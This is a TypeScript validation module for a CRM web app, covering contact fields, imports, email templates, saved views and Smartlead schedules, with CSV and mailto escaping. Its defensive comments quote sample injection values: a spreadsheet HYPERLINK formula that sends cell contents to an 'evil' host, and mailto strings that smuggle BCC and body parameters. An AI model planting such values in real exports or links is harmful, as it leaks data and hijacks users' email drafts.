// Shared input validation for both write entry points: the session-based route
// action (app/routes/home.tsx) and the machine API (app/routes/api.hyperagent.ts).
//
// Before this module the two disagreed about what was acceptable — the machine
// API checked `status` against a whitelist while the session action wrote any
// string it was handed. Everything that validates a CRM write now lives here so
// the two can't drift again.
//
// Isomorphic on purpose (no `.server` suffix): the client uses the same limits
// for `maxLength` attributes and the CSV import preview, so the browser and the
// server agree on what will be rejected.

import { CH, OWNERS, STATUSES } from "../crm/data";
import {
  TEMPLATE_STATUSES,
  VARIANT_SLOTS,
  type TemplateStatus,
  type VariantSlot,
} from "../crm/templates";
import {
  VIEW_FIELDS,
  VIEW_OPS,
  type ViewCondition,
  type ViewOp,
} from "../crm/views";

/**
 * Per-field maximum lengths, in characters, applied after trimming. Generous
 * enough never to bite a real contact (320 is the RFC 5321 maximum for an email
 * address) but bounded so a single field can't carry a megabyte into D1.
 */
export const LIMITS = {
  name: 200,
  company: 200,
  email: 320,
  phone: 60,
  linkedin: 500,
  source: 200,
  status: 60,
  note: 5_000,
  // Email templates. `body` is twice `note` because an email body is not a CRM
  // note — a real cold intro with merge tokens runs long, and truncating one at
  // 5k would silently mangle the copy someone is about to send.
  templateName: 120,
  subject: 300,
  body: 10_000,
  // Smartlead campaign name. Same order as templateName — it is a label in
  // someone else's UI, not content.
  campaignName: 120,
  // Saved-view name. Same family again: it is a sidebar row label, not content.
  viewName: 120,
  // IANA zone identifier ("America/New_York"). Bounded well above the longest
  // real zone name.
  timezone: 60,
} as const;

/** Maximum rows accepted in one CSV / API import. */
export const MAX_IMPORT_ROWS = 2_000;

/** Maximum ids accepted by a bulk operation (delete, mark-ads-sent). */
export const MAX_IDS = 1_000;

/** Maximum size of an uploaded CSV file, in bytes. */
export const MAX_CSV_BYTES = 2 * 1024 * 1024;

/**
 * Largest counter a sender may push for one template variant. Ten million sends
 * would be a bug in the sending tool, not a campaign — and an unbounded integer
 * here feeds straight into the z-test, where a garbage denominator produces a
 * confident, wrong verdict.
 */
export const MAX_STAT_COUNT = 10_000_000;

/** Furthest day of a sequence a template may be scheduled on. */
export const MAX_SEND_DAY = 365;

/** Clauses one saved view may AND together. */
export const MAX_VIEW_CONDITIONS = 10;

/**
 * Saved views the team may keep, in total.
 *
 * Bounded because every view a viewer can see is serialized into the SSR payload
 * of every contacts-page render, and each one is also counted against the whole
 * contact list to fill its sidebar row. Same bounding discipline as MAX_IDS and
 * MAX_IMPORT_ROWS: nothing unbounded reaches a render path.
 */
export const MAX_SAVED_VIEWS = 50;

/**
 * Why a deal died, offered when a contact's status is set to Dead. A closed set
 * rather than free text: the analytics panel groups on this value exactly, and a
 * typo would silently become its own bucket. The client imports it to render the
 * picker, so both ends offer and accept the same five.
 */
export const DEAD_REASONS = [
  "No response",
  "Not a fit",
  "Timing",
  "Price",
  "Competitor",
] as const;

const STATUS_IDS: ReadonlySet<string> = new Set(STATUSES.map((s) => s.id));
const TOUCH_TYPES: ReadonlySet<string> = new Set(Object.keys(CH));
const DEAD_REASON_SET: ReadonlySet<string> = new Set(DEAD_REASONS);
const TEMPLATE_STATUS_SET: ReadonlySet<string> = new Set(TEMPLATE_STATUSES);
const VARIANT_SLOT_SET: ReadonlySet<string> = new Set(VARIANT_SLOTS);
const VIEW_FIELD_SET: ReadonlySet<string> = new Set(VIEW_FIELDS.map((f) => f.key));
const VIEW_OP_SET: ReadonlySet<string> = new Set(VIEW_OPS);

/**
 * Each filterable field's closed value set, so a condition's value can be checked
 * against the field it names rather than against a flat union of every field's
 * values — otherwise `owner is New` would validate.
 */
const VIEW_VALUE_SETS: ReadonlyMap<string, ReadonlySet<string>> = new Map(
  VIEW_FIELDS.map((f) => [f.key, new Set(f.options.map((o) => o.value))]),
);

export function isValidStatus(value: unknown): value is string {
  return typeof value === "string" && STATUS_IDS.has(value);
}

export function isValidTouchType(value: unknown): value is string {
  return typeof value === "string" && TOUCH_TYPES.has(value);
}

export function isValidDeadReason(value: unknown): value is string {
  return typeof value === "string" && DEAD_REASON_SET.has(value);
}

export function isValidTemplateStatus(value: unknown): value is TemplateStatus {
  return typeof value === "string" && TEMPLATE_STATUS_SET.has(value);
}

export function isValidVariantSlot(value: unknown): value is VariantSlot {
  return typeof value === "string" && VARIANT_SLOT_SET.has(value);
}

export function isValidViewField(value: unknown): value is string {
  return typeof value === "string" && VIEW_FIELD_SET.has(value);
}

export function isValidViewOp(value: unknown): value is ViewOp {
  return typeof value === "string" && VIEW_OP_SET.has(value);
}

/** Loop numbers are a closed set of two; anything else is a bug or an attack. */
export function isValidLoop(value: unknown): value is number {
  return value === 1 || value === 2;
}

/**
 * Owners are looked up as `OWNERS[name]` in the UI, so an arbitrary string here
 * would reach a prototype-chain property (`"constructor"` returns a function,
 * not undefined). `Object.hasOwn` keeps the lookup to real own keys.
 */
export function isValidOwner(value: unknown): value is string {
  return typeof value === "string" && Object.hasOwn(OWNERS, value);
}

/**
 * Coerce an unknown value to a trimmed string. Non-strings become "" rather
 * than throwing — several call sites previously did `.trim()` straight on a
 * JSON-parsed value, which threw a TypeError when a caller sent a number.
 */
export function asString(value: unknown): string {
  return typeof value === "string" ? value.trim() : "";
}

/** True when `value` is a string that fits within `max` after trimming. */
export function fits(value: unknown, max: number): boolean {
  return asString(value).length <= max;
}

// Deliberately permissive about what an address may contain — this rejects the
// obviously malformed (spaces, no @, no dot in the domain) without trying to
// out-guess RFC 5322. The allowlist, not this regex, decides who may sign in.
//
// The excluded set does include the URL-significant characters `? & = # % /`,
// which real addresses never carry. That is load-bearing for safeMailto(): an
// address ending `?subject=…&body=…` is otherwise well-formed enough to pass a
// naive check, and would then prefill an attacker-controlled draft in the user's
// mail client. Excluding a second `@` is not sufficient — that only catches the
// `?bcc=someone@evil.com` shape, not `?subject=x&body=y`.
const EMAIL_CHAR = `[^\\s@,;:<>"'()\\[\\]\\\\?&=#%/]`;
const EMAIL_RE = new RegExp(`^${EMAIL_CHAR}+@${EMAIL_CHAR}+\\.${EMAIL_CHAR}+$`);

export function isValidEmail(value: unknown): boolean {
  const s = asString(value);
  return s.length > 0 && s.length <= LIMITS.email && EMAIL_RE.test(s);
}

export type ContactFields = {
  name: string;
  company: string;
  email: string | null;
  phone: string | null;
  linkedin: string | null;
  loops: number[] | undefined;
  owner: string | null;
  status: string;
  source: string | null;
};

export type ValidationResult =
  | { ok: true; value: ContactFields }
  | { ok: false; error: string };

/**
 * Validate and normalize one contact from either entry point. Accepts `unknown`
 * for every field because both callers receive untrusted input (FormData values
 * on one side, `JSON.parse` output on the other) — nothing here may assume a
 * string arrived.
 *
 * Unknown `owner` / `status` values are rejected rather than silently dropped:
 * a caller sending "Bretton" wants to know it didn't stick, and silently writing
 * NULL would let a typo escape the owner filter and the cross-owner conflict
 * check without any signal.
 */
export function validateContact(raw: unknown): ValidationResult {
  const r = (raw ?? {}) as Record<string, unknown>;

  const name = asString(r.name);
  if (!name) return { ok: false, error: "Name is required." };
  if (name.length > LIMITS.name) {
    return { ok: false, error: `Name must be ${LIMITS.name} characters or fewer.` };
  }

  const company = asString(r.company);
  if (company.length > LIMITS.company) {
    return { ok: false, error: `Company must be ${LIMITS.company} characters or fewer.` };
  }

  const email = asString(r.email);
  if (email && !isValidEmail(email)) {
    return { ok: false, error: `"${truncateForMessage(email)}" is not a valid email address.` };
  }

  const phone = asString(r.phone);
  if (phone.length > LIMITS.phone) {
    return { ok: false, error: `Phone must be ${LIMITS.phone} characters or fewer.` };
  }

  const linkedin = asString(r.linkedin);
  if (linkedin.length > LIMITS.linkedin) {
    return { ok: false, error: `LinkedIn must be ${LIMITS.linkedin} characters or fewer.` };
  }

  const source = asString(r.source);
  if (source.length > LIMITS.source) {
    return { ok: false, error: `Source must be ${LIMITS.source} characters or fewer.` };
  }

  // Empty/absent status means "use the default", which matches the previous
  // `form.get("status") || "New"` behaviour.
  const rawStatus = asString(r.status);
  const status = rawStatus || "New";
  if (!isValidStatus(status)) {
    return { ok: false, error: `Unknown status "${truncateForMessage(rawStatus)}".` };
  }

  // "Unassigned" is the sentinel the add-contact form's select submits.
  const rawOwner = asString(r.owner);
  const ownerGiven = rawOwner && rawOwner !== "Unassigned";
  if (ownerGiven && !isValidOwner(rawOwner)) {
    return { ok: false, error: `Unknown owner "${truncateForMessage(rawOwner)}".` };
  }

  let loops: number[] | undefined;
  if (r.loops !== undefined && r.loops !== null) {
    if (!Array.isArray(r.loops)) {
      return { ok: false, error: "Loops must be an array." };
    }
    const parsed = r.loops.map(Number).filter(isValidLoop);
    // An array that was present but contained nothing usable is a caller error,
    // not a request for the default.
    if (!parsed.length) return { ok: false, error: "Loops must contain 1 or 2." };
    loops = [...new Set(parsed)].sort();
  }

  return {
    ok: true,
    value: {
      name,
      company,
      email: email || null,
      phone: phone || null,
      linkedin: linkedin || null,
      loops,
      owner: ownerGiven ? rawOwner : null,
      status,
      source: source || null,
    },
  };
}

/**
 * Validate a batch of imported rows. Invalid rows are skipped rather than
 * failing the whole import — a 500-row CSV with three bad addresses should
 * still land the other 497 — but the count and the first reason come back so
 * the UI can say what was dropped.
 */
export function validateImportRows(raw: unknown):
  | { ok: true; rows: ContactFields[]; skipped: number; firstError: string | null }
  | { ok: false; error: string } {
  if (!Array.isArray(raw)) {
    return { ok: false, error: "Imported rows must be an array." };
  }
  if (raw.length > MAX_IMPORT_ROWS) {
    return {
      ok: false,
      error: `Too many rows: ${raw.length}. The maximum per import is ${MAX_IMPORT_ROWS}.`,
    };
  }

  const rows: ContactFields[] = [];
  let skipped = 0;
  let firstError: string | null = null;

  for (const row of raw) {
    const result = validateContact(row);
    if (result.ok) {
      rows.push(result.value);
    } else {
      skipped++;
      if (!firstError) firstError = result.error;
    }
  }

  if (!rows.length) {
    return { ok: false, error: firstError ?? "No valid contacts to import." };
  }
  return { ok: true, rows, skipped, firstError };
}

/**
 * Validate a bulk id list. Ids are opaque to us (they're `crypto.randomUUID()`
 * output), so this bounds the count and drops non-strings rather than checking
 * a format — a wrong-but-well-formed id simply matches no row.
 */
export function validateIds(raw: unknown):
  | { ok: true; ids: string[] }
  | { ok: false; error: string } {
  if (!Array.isArray(raw)) return { ok: false, error: "Expected a list of contacts." };
  if (!raw.length) return { ok: false, error: "No contacts selected." };
  if (raw.length > MAX_IDS) {
    return {
      ok: false,
      error: `Too many contacts selected: ${raw.length}. The maximum is ${MAX_IDS}.`,
    };
  }
  const ids = [...new Set(raw.filter((id): id is string => typeof id === "string" && !!id))];
  if (!ids.length) return { ok: false, error: "No contacts selected." };
  return { ok: true, ids };
}

/** Bound a free-text note. Returns null when empty. */
export function validateNote(raw: unknown):
  | { ok: true; text: string }
  | { ok: false; error: string } {
  const text = asString(raw);
  if (!text) return { ok: false, error: "Note text is required." };
  if (text.length > LIMITS.note) {
    return { ok: false, error: `Notes must be ${LIMITS.note} characters or fewer.` };
  }
  return { ok: true, text };
}

/** Keep an echoed-back bad value short so an error message can't be a payload. */
function truncateForMessage(value: string): string {
  return value.length > 40 ? value.slice(0, 40) + "…" : value;
}

// ---------------------------------------------------------------------------
// Email templates
// ---------------------------------------------------------------------------

export type TemplateFields = { name: string; loop: number; sendDay: number };

/**
 * Validate a template's settings (name, loop, which day of the sequence it goes
 * out on). Mirrors validateContact: accepts `unknown` for every field because
 * both entry points hand over untrusted input.
 *
 * The *create* path does not call this — "+ New" writes the `UNTITLED` constant
 * and the defaults, so a name is only ever required once someone edits it.
 */
export function validateTemplate(raw: unknown):
  | { ok: true; value: TemplateFields }
  | { ok: false; error: string } {
  const r = (raw ?? {}) as Record<string, unknown>;

  const name = asString(r.name);
  if (!name) return { ok: false, error: "Template name is required." };
  if (name.length > LIMITS.templateName) {
    return {
      ok: false,
      error: `Template name must be ${LIMITS.templateName} characters or fewer.`,
    };
  }

  // Absent means "the default" — Loop 1, the always-on sequence.
  const rawLoop = r.loop;
  const loop = rawLoop === undefined || rawLoop === null || rawLoop === "" ? 1 : Number(rawLoop);
  if (!isValidLoop(loop)) return { ok: false, error: "Loop must be 1 or 2." };

  const rawSendDay = r.sendDay;
  const sendDay =
    rawSendDay === undefined || rawSendDay === null || rawSendDay === ""
      ? 0
      : Number(rawSendDay);
  if (!Number.isInteger(sendDay) || sendDay < 0 || sendDay > MAX_SEND_DAY) {
    return {
      ok: false,
      error: `Send day must be a whole number between 0 and ${MAX_SEND_DAY}.`,
    };
  }

  return { ok: true, value: { name, loop, sendDay } };
}

/**
 * Validate one variant's copy.
 *
 * Both fields may be **empty**: a draft in progress has to be savable, and the
 * page renders a placeholder for each. Only over-length is an error.
 *
 * No sanitisation of the `{{first_name}}` / `{{company}}` / `{{sender}}` merge
 * tokens, and none is wanted: the copy is stored verbatim and rendered as a text
 * node, never as HTML and never interpolated. If a future feature does start
 * substituting them, the escaping belongs at that point of use, not here.
 */
export function validateVariantContent(raw: unknown):
  | { ok: true; value: { subject: string; body: string } }
  | { ok: false; error: string } {
  const r = (raw ?? {}) as Record<string, unknown>;

  const subject = asString(r.subject);
  if (subject.length > LIMITS.subject) {
    return { ok: false, error: `Subject must be ${LIMITS.subject} characters or fewer.` };
  }

  const body = asString(r.body);
  if (body.length > LIMITS.body) {
    return { ok: false, error: `Body must be ${LIMITS.body} characters or fewer.` };
  }

  return { ok: true, value: { subject, body } };
}

/**
 * One pushed counter set. `null` means "leave this column alone" — see
 * validateStats for why that is not the same as zero.
 */
export type StatCounts = {
  sends: number | null;
  opens: number | null;
  replies: number | null;
  meetings: number | null;
};

const STAT_KEYS = ["sends", "opens", "replies", "meetings"] as const;

/**
 * Validate a stats push. Every field is optional, and absent (`undefined`,
 * `null` or `""`) maps to `null`, which recordVariantStats() COALESCEs into "keep
 * the stored value".
 *
 * That distinction is load-bearing: `Number("")` is `0`, so coercing blindly
 * would let a caller that mentions only `replies` silently zero the other three
 * counters — and since the verdict is computed from them, that reads as a real
 * change in performance rather than a bug.
 *
 * No cross-field validation (`opens <= sends`, `replies <= opens`). Pixel-blocking
 * makes `replies > opens` genuinely common, and partial pushes arrive out of
 * order, so those inequalities are false in the real world often enough that
 * enforcing them would reject correct data.
 */
export function validateStats(raw: unknown):
  | { ok: true; value: StatCounts }
  | { ok: false; error: string } {
  const r = (raw ?? {}) as Record<string, unknown>;
  const value: StatCounts = { sends: null, opens: null, replies: null, meetings: null };
  let given = 0;

  for (const key of STAT_KEYS) {
    const rawValue = r[key];
    if (rawValue === undefined || rawValue === null || rawValue === "") continue;
    const n = Number(typeof rawValue === "string" ? rawValue.trim() : rawValue);
    if (!Number.isInteger(n) || n < 0 || n > MAX_STAT_COUNT) {
      const shown = truncateForMessage(String(rawValue));
      return {
        ok: false,
        error: `"${shown}" is not a whole number between 0 and ${MAX_STAT_COUNT}.`,
      };
    }
    value[key] = n;
    given++;
  }

  if (!given) return { ok: false, error: "Nothing to record." };
  return { ok: true, value };
}

/**
 * Resolve which variant a write targets: an opaque `variantId`, or the stable
 * `slot` ("A"/"B") within a template.
 *
 * The slot form exists for the machine caller — it can store one id per template
 * and keep pushing to "B" even if B is added long after it was configured. It is
 * unambiguous because of the unique (template_id, slot) index.
 *
 * Shared by the form action and /api/hyperagent so the two can't drift, which is
 * the entire reason this module exists.
 */
export function validateVariantTarget(raw: unknown):
  | { ok: true; value: { templateId: string; variantId?: string; slot?: string } }
  | { ok: false; error: string } {
  const r = (raw ?? {}) as Record<string, unknown>;

  const templateId = asString(r.templateId);
  if (!templateId) return { ok: false, error: "Missing template id." };

  const variantId = asString(r.variantId);
  const slot = asString(r.slot);

  if (variantId && slot) {
    return { ok: false, error: "Give either a variant id or a slot, not both." };
  }
  if (variantId) return { ok: true, value: { templateId, variantId } };
  if (slot) {
    if (!isValidVariantSlot(slot)) {
      return { ok: false, error: `Unknown variant "${truncateForMessage(slot)}".` };
    }
    return { ok: true, value: { templateId, slot } };
  }
  return { ok: false, error: "Missing variant id or slot." };
}

// ---------------------------------------------------------------------------
// Saved views
// ---------------------------------------------------------------------------

/**
 * A saved view's settings. Note what is absent: any creator identity. This module
 * knows nothing about sessions, so createSavedView() takes the creator as a
 * separate parameter — the same split as removeVariant(db, ..., actor).
 */
export type SavedViewFields = {
  name: string;
  shared: boolean;
  conditions: ViewCondition[];
};

/**
 * Coerce a checkbox-ish value to a boolean. FormData gives "on" for a checked
 * box, the client sends "1"/"0", and a JSON caller would send a real boolean —
 * all three have to mean the same thing.
 */
function asBool(value: unknown, fallback: boolean): boolean {
  if (typeof value === "boolean") return value;
  if (typeof value === "number") return value !== 0;
  if (typeof value !== "string") return fallback;
  const v = value.trim().toLowerCase();
  if (v === "") return fallback;
  return v === "1" || v === "true" || v === "on" || v === "yes";
}

/**
 * Validate a saved view. Mirrors validateTemplate: accepts `unknown` for every
 * field, and returns a user-facing sentence rather than a code.
 *
 * The empty-conditions check is load-bearing. matchesConditions([]) is a vacuous
 * AND and so matches every contact — saving one would produce a view that
 * silently means "all contacts" under a name promising something narrower, which
 * reads as the filter being broken rather than as the view being empty.
 *
 * Each value is checked against *its own field's* option set. A value outside it
 * is not an injection risk (nothing here reaches SQL — see app/crm/views.ts), but
 * it renders as a view that matches nothing, forever, with no way to tell why.
 */
export function validateSavedView(raw: unknown):
  | { ok: true; value: SavedViewFields }
  | { ok: false; error: string } {
  const r = (raw ?? {}) as Record<string, unknown>;

  const name = asString(r.name);
  if (!name) return { ok: false, error: "View name is required." };
  if (name.length > LIMITS.viewName) {
    return { ok: false, error: `View name must be ${LIMITS.viewName} characters or fewer.` };
  }

  const rawConditions = r.conditions;
  if (!Array.isArray(rawConditions) || rawConditions.length === 0) {
    return { ok: false, error: "Add at least one condition." };
  }
  if (rawConditions.length > MAX_VIEW_CONDITIONS) {
    return {
      ok: false,
      error: `A view can have at most ${MAX_VIEW_CONDITIONS} conditions.`,
    };
  }

  const conditions: ViewCondition[] = [];
  for (const entry of rawConditions) {
    const e = (entry ?? {}) as Record<string, unknown>;
    const field = asString(e.field);
    if (!isValidViewField(field)) {
      return { ok: false, error: `Unknown filter field "${truncateForMessage(field)}".` };
    }
    const op = asString(e.op);
    if (!isValidViewOp(op)) {
      return { ok: false, error: `Unknown filter operator "${truncateForMessage(op)}".` };
    }
    const value = asString(e.value);
    if (!VIEW_VALUE_SETS.get(field)?.has(value)) {
      return { ok: false, error: `Unknown value "${truncateForMessage(value)}".` };
    }
    conditions.push({ field, op, value });
  }

  return { ok: true, value: { name, shared: asBool(r.shared, true), conditions } };
}

// ---------------------------------------------------------------------------
// Smartlead
//
// The sending tool the /smartlead page drives. Everything below guards a value
// that is about to leave this app for a third-party API, which is a different
// threat model from the rest of this module: a bad `status` here doesn't corrupt
// a local filter, it makes a paid campaign start sending.
// ---------------------------------------------------------------------------

/**
 * Campaign lifecycle values Smartlead accepts as *input*.
 *
 * Note `START`, not `ACTIVE`. Smartlead's API takes START to activate or resume a
 * campaign but reports the resulting state as ACTIVE, so a response value copied
 * straight back into a request is rejected. Keeping the input set closed here is
 * what stops that round-trip being attempted.
 */
export const SMARTLEAD_STATUSES = ["START", "PAUSED", "STOPPED"] as const;
export type SmartleadStatus = (typeof SMARTLEAD_STATUSES)[number];

const SMARTLEAD_STATUS_SET: ReadonlySet<string> = new Set(SMARTLEAD_STATUSES);

export function isValidSmartleadStatus(value: unknown): value is SmartleadStatus {
  return typeof value === "string" && SMARTLEAD_STATUS_SET.has(value);
}

/** Largest contact push accepted in one action. See the chunk size below. */
export const MAX_LEAD_PUSH = 1_000;

/**
 * Leads per Smartlead request. Their endpoint caps a `lead_list` at around 100,
 * and each chunk is one Worker subrequest — so MAX_LEAD_PUSH / this is the
 * subrequest cost of a full push (10), comfortably inside the platform ceiling.
 */
export const SMARTLEAD_LEAD_CHUNK = 100;

/** Rows read per page when totalling campaign statistics. */
export const SMARTLEAD_STATS_PAGE = 100;

/**
 * Pages of statistics one sync will read. Deliberately a hard stop rather than a
 * "read what we can": these counters are ABSOLUTE lifetime totals, so writing a
 * partial aggregate doesn't under-report by a little, it looks like performance
 * collapsed. The sync writes nothing and says so instead.
 */
export const SMARTLEAD_STATS_MAX_PAGES = 20;

/**
 * Validate a Smartlead campaign id.
 *
 * Load-bearing beyond the usual bounds check: this value is interpolated into a
 * URL *path* (`/campaigns/{id}/sequences`). Digits only means it cannot carry a
 * `../`, a query string, or anything else that would re-point the request at a
 * different endpoint — the same reasoning as isValidEmail excluding `? & = # % /`
 * for safeMailto's benefit.
 */
export function validateCampaignId(raw: unknown):
  | { ok: true; id: string }
  | { ok: false; error: string } {
  const id = asString(raw);
  if (!id) return { ok: false, error: "Missing campaign id." };
  if (!/^\d{1,20}$/.test(id)) {
    return { ok: false, error: `"${truncateForMessage(id)}" is not a valid campaign id.` };
  }
  return { ok: true, id };
}

/** Validate a campaign name for the create path. */
export function validateCampaignName(raw: unknown):
  | { ok: true; name: string }
  | { ok: false; error: string } {
  const name = asString(raw);
  if (!name) return { ok: false, error: "Campaign name is required." };
  if (name.length > LIMITS.campaignName) {
    return {
      ok: false,
      error: `Campaign name must be ${LIMITS.campaignName} characters or fewer.`,
    };
  }
  return { ok: true, name };
}

export type ScheduleFields = {
  timezone: string;
  /** Days of the week Smartlead may send on, 0 = Sunday. Sorted, deduped, non-empty. */
  days: number[];
  startHour: string;
  endHour: string;
  minGapMinutes: number;
  maxLeadsPerDay: number;
  /** ISO instant the campaign should begin, or null for "as soon as it's started". */
  startAt: string | null;
};

// "HH:MM" on a 24-hour clock, which is the format Smartlead's schedule endpoint
// documents for start_hour / end_hour.
const HOUR_RE = /^([01]\d|2[0-3]):[0-5]\d$/;

// "UTC", or an IANA "Area/Location" identifier. Not checked against the real zone
// list — Workers has no tzdata to consult and Smartlead rejects an unknown zone
// itself; this only keeps something structurally absurd out of the request body.
const TIMEZONE_RE = /^(UTC|[A-Za-z_]+\/[A-Za-z0-9_+-]+)$/;

/**
 * Validate a sending-schedule form.
 *
 * Every bound here is a real-world sanity limit rather than a Smartlead one:
 * a campaign is a paid resource with a deliverability cost, and a mistyped
 * `max_new_leads_per_day` of 100000 burns a domain's reputation before anyone
 * notices. An empty `days` is rejected outright — Smartlead accepts it, and it
 * silently means the campaign never sends.
 */
export function validateSchedule(raw: unknown):
  | { ok: true; value: ScheduleFields }
  | { ok: false; error: string } {
  const r = (raw ?? {}) as Record<string, unknown>;

  const timezone = asString(r.timezone);
  if (!timezone) return { ok: false, error: "Timezone is required." };
  if (timezone.length > LIMITS.timezone || !TIMEZONE_RE.test(timezone)) {
    return { ok: false, error: `"${truncateForMessage(timezone)}" is not a valid timezone.` };
  }

  if (!Array.isArray(r.days)) return { ok: false, error: "Sending days must be an array." };
  const days = [
    ...new Set(r.days.map(Number).filter((n) => Number.isInteger(n) && n >= 0 && n <= 6)),
  ].sort((a, b) => a - b);
  if (!days.length) return { ok: false, error: "Pick at least one sending day." };

  const startHour = asString(r.startHour);
  const endHour = asString(r.endHour);
  if (!HOUR_RE.test(startHour) || !HOUR_RE.test(endHour)) {
    return { ok: false, error: "Sending hours must look like 09:00." };
  }
  if (startHour >= endHour) {
    // Lexicographic compare is exact for zero-padded HH:MM. Smartlead treats an
    // inverted window as an empty one, so the campaign silently never sends.
    return { ok: false, error: "The start hour must be before the end hour." };
  }

  const minGapMinutes = Number(asString(r.minGapMinutes));
  if (!Number.isInteger(minGapMinutes) || minGapMinutes < 1 || minGapMinutes > 1_440) {
    return { ok: false, error: "Minutes between emails must be between 1 and 1440." };
  }

  const maxLeadsPerDay = Number(asString(r.maxLeadsPerDay));
  if (!Number.isInteger(maxLeadsPerDay) || maxLeadsPerDay < 1 || maxLeadsPerDay > 10_000) {
    return { ok: false, error: "New leads per day must be between 1 and 10000." };
  }

  // Optional. Parsed rather than passed through so a malformed value fails here
  // instead of being rejected opaquely by Smartlead, and re-serialised to ISO so
  // the request body never carries a locale-dependent string.
  const rawStartAt = asString(r.startAt);
  let startAt: string | null = null;
  if (rawStartAt) {
    const ms = Date.parse(rawStartAt);
    if (Number.isNaN(ms)) {
      return { ok: false, error: "Start date isn’t a valid date and time." };
    }
    startAt = new Date(ms).toISOString();
  }

  return {
    ok: true,
    value: { timezone, days, startHour, endHour, minGapMinutes, maxLeadsPerDay, startAt },
  };
}

// ---------------------------------------------------------------------------
// Output escaping
// ---------------------------------------------------------------------------

/**
 * Escape one CSV cell.
 *
 * Two separate jobs: RFC 4180 quoting (commas, quotes, newlines), and *formula
 * injection*. Excel and Google Sheets execute a cell beginning with `=`, `+`,
 * `-`, `@`, tab or CR, so an exported contact named
 * `=HYPERLINK("https://evil/"&A1,"Click")` runs on open. Prefixing with an
 * apostrophe forces the spreadsheet to treat it as literal text.
 */
export function csvCell(value: string): string {
  const raw = value ?? "";
  const neutralized = /^[=+\-@\t\r]/.test(raw) ? "'" + raw : raw;
  // Tabs are quoted alongside the RFC 4180 set because this app's own CSV
  // importer splits on /[,\t]/ — an unquoted tab would re-import into the wrong
  // column.
  return /[",\n\r\t]/.test(neutralized)
    ? '"' + neutralized.replace(/"/g, '""') + '"'
    : neutralized;
}

/**
 * Build a `mailto:` href from a stored address.
 *
 * A raw address is interpolated straight into the URL by the detail panel, so
 * `victim@corp.com?bcc=attacker@evil.com&body=…` would prefill an
 * attacker-controlled BCC and body in the user's mail client. Anything that
 * isn't a plain valid address gets no link at all.
 */
export function safeMailto(email: string): string | null {
  const s = asString(email);
  if (!isValidEmail(s)) return null;
  // Safe to interpolate directly: isValidEmail rejects whitespace and every
  // character with meaning in a URL (`? & = # % /`), which is exactly the set an
  // injected header would need. Percent-encoding on top of that would only
  // mangle legitimate addresses — `jane+crm@acme.co.uk` would become
  // `jane%2Bcrm@…`, which not every mail client decodes back.
  return "mailto:" + s;
}
